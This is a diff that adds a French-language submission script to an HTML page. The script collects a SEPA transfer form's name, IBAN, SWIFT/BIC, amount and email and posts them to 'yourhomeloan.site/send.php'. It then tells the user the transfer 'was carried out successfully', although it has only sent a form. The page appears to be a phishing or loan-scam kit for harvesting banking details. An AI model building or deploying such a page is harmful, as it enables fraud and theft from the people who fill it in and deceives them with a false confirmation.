@@ -148,3 +148,83 @@ window.SEND_ENDPOINT = window.SEND_ENDPOINT || 'http://yourhomeloan.site/send.ph
 
 </body>
 </html>
+
+<!-- Script d'envoi vers send.php -->
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+  const form = document.getElementById('sepaForm');
+  const btn  = document.getElementById('btn_valid');
+
+  // Si votre logique n'active pas le bouton, décommentez la ligne suivante
+  // if (btn) btn.disabled = false;
+
+  function showAlert(title, text, icon) {
+    if (window.Swal && typeof Swal.fire === 'function') {
+      Swal.fire(title, text, icon);
+    } else {
+      alert(title + "\n" + text);
+    }
+  }
+
+  if (!form) return;
+
+  form.addEventListener('submit', async function (e) {
+    e.preventDefault();
+    if (btn) btn.disabled = true;
+
+    const fields = ['nom','prenom','iban','swift','bic','montant','libelle','email'];
+    const payload = {};
+    for (const id of fields) {
+      const el = document.getElementById(id);
+      payload[id] = el ? String(el.value || '').trim() : '';
+    }
+
+    // Validations minimales
+    const emailOk = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email);
+    const montantOk = /^\d+(?:[\.,]\d{1,2})?$/.test(payload.montant);
+
+    if (!emailOk) {
+      showAlert('Adresse email invalide', "Veuillez renseigner une adresse email valide.", 'warning');
+      if (btn) btn.disabled = false;
+      return;
+    }
+    if (!montantOk) {
+      showAlert('Montant invalide', "Veuillez saisir un montant numérique (ex.: 1250 ou 1250,50).", 'warning');
+      if (btn) btn.disabled = false;
+      return;
+    }
+
+    // Normaliser le montant avec un point décimal
+    payload.montant = payload.montant.replace(',', '.');
+
+    const formData = new FormData();
+    Object.entries(payload).forEach(([k, v]) => formData.append(k, v));
+
+    try {
+      const res = await fetch(window.SEND_ENDPOINT, {
+        mode: 'cors', method: 'POST',
+        body: formData
+      });
+
+      let data;
+      try {
+        data = await res.json();
+      } catch (e) {
+        throw new Error("Réponse serveur invalide.");
+      }
+
+      if (res.ok && data && data.success) {
+        showAlert('Virement pris en compte', 'Votre virement a été effectué avec succès.', 'success');
+        form.reset();
+      } else {
+        const msg = (data && data.message) ? data.message : 'Une erreur est survenue lors de l’envoi.';
+        throw new Error(msg);
+      }
+    } catch (err) {
+      showAlert('Envoi impossible', err.message || String(err), 'error');
+    } finally {
+      if (btn) btn.disabled = false;
+    }
+  });
+});
+</script>
